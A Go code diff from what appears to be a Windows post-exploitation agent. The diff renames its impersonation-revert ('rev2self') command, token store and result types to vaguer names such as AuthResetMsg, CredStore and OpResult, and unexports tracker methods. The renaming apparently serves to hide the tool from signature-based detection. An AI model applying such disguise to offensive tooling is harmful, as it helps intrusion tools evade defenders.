@@ -23,7 +23,7 @@ var (
 	procWNetGetConnection     *syscall.LazyProc
 
 	// Track network resources accessed with network-only tokens
-	networkResourceTracker = &NetworkResourceTracker{
+	networkResourceTracker = &NetResMon{
 		resources: make(map[string]bool),
 	}
 )
@@ -162,13 +162,13 @@ type NETRESOURCE struct {
 	Provider    *uint16
 }
 
-type NetworkResourceTracker struct {
+type NetResMon struct {
 	mu        sync.RWMutex
 	resources map[string]bool
 }
 
-// TrackNetworkResource adds a network path to the tracker
-func (nrt *NetworkResourceTracker) TrackNetworkResource(path string) {
+// trackNetworkResource adds a network path to the tracker
+func (nrt *NetResMon) trackNetworkResource(path string) {
 	if !strings.HasPrefix(path, r2sUncPrefix()) {
 		return
 	}
@@ -193,8 +193,8 @@ func (nrt *NetworkResourceTracker) TrackNetworkResource(path string) {
 	}
 }
 
-// GetTrackedResources returns all tracked network resources
-func (nrt *NetworkResourceTracker) GetTrackedResources() []string {
+// getTrackedResources returns all tracked network resources
+func (nrt *NetResMon) getTrackedResources() []string {
 	nrt.mu.RLock()
 	defer nrt.mu.RUnlock()
 
@@ -205,8 +205,8 @@ func (nrt *NetworkResourceTracker) GetTrackedResources() []string {
 	return resources
 }
 
-// ClearTrackedResources clears the tracked resources
-func (nrt *NetworkResourceTracker) ClearTrackedResources() {
+// clearTrackedResources clears the tracked resources
+func (nrt *NetResMon) clearTrackedResources() {
 	nrt.mu.Lock()
 	defer nrt.mu.Unlock()
 	nrt.resources = make(map[string]bool)
@@ -308,7 +308,7 @@ func EnumerateNetworkConnections() []string {
 // DisconnectTrackedNetworkResources disconnects only tracked network resources
 func DisconnectTrackedNetworkResources() []string {
 	disconnected := []string{}
-	resources := networkResourceTracker.GetTrackedResources()
+	resources := networkResourceTracker.getTrackedResources()
 
 	for _, resource := range resources {
 		// Try different disconnection strategies
@@ -341,7 +341,7 @@ func DisconnectTrackedNetworkResources() []string {
 	}
 
 	// Clear the tracker after disconnecting
-	networkResourceTracker.ClearTrackedResources()
+	networkResourceTracker.clearTrackedResources()
 
 	return disconnected
 }
@@ -363,10 +363,10 @@ func DisconnectAllNetworkConnections() []string {
 	return disconnected
 }
 
-// Rev2SelfCommand handles reverting impersonation
-type Rev2SelfCommand struct{}
+// AuthResetMsg handles reverting impersonation
+type AuthResetMsg struct{}
 
-func (c *Rev2SelfCommand) Execute(ctx *CommandContext, args []string) CommandResult {
+func (c *AuthResetMsg) execute(ctx *OpCtx, args []string) OpResult {
 	// Get current user info before reverting
 	beforeUser, beforeDomain := c.getCurrentUserInfo()
 
@@ -414,10 +414,10 @@ func (c *Rev2SelfCommand) Execute(ctx *CommandContext, args []string) CommandRes
 	// Call Windows API to revert impersonation
 	err := RevertToSelf()
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      ErrCtx(E42, err.Error()),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -427,7 +427,7 @@ func (c *Rev2SelfCommand) Execute(ctx *CommandContext, args []string) CommandRes
 	// Clean up stored state in context
 	if ctx != nil && ctx.TokenStore != nil {
 		ctx.mu.Lock()
-		if tokenStore, ok := ctx.TokenStore.(*UnifiedTokenStore); ok {
+		if tokenStore, ok := ctx.TokenStore.(*CredStore); ok {
 			tokenStore.mu.Lock()
 			tokenStore.IsImpersonating = false
 			tokenStore.ActiveToken = ""
@@ -504,15 +504,15 @@ func (c *Rev2SelfCommand) Execute(ctx *CommandContext, args []string) CommandRes
 		}
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:      output,
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
 // Helper functions
-func (c *Rev2SelfCommand) getCurrentUserInfo() (string, string) {
+func (c *AuthResetMsg) getCurrentUserInfo() (string, string) {
 	// Try to get from current thread token first (impersonation)
 	var threadToken syscall.Token
 	err := OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, true, &threadToken)
@@ -531,7 +531,7 @@ func (c *Rev2SelfCommand) getCurrentUserInfo() (string, string) {
 	return r2sUnknown(), r2sUnknown()
 }
 
-func (c *Rev2SelfCommand) getTokenUserInfo(token syscall.Handle) (string, string) {
+func (c *AuthResetMsg) getTokenUserInfo(token syscall.Handle) (string, string) {
 	var needed uint32
 	procGetTokenInformation.Call(
 		uintptr(token),
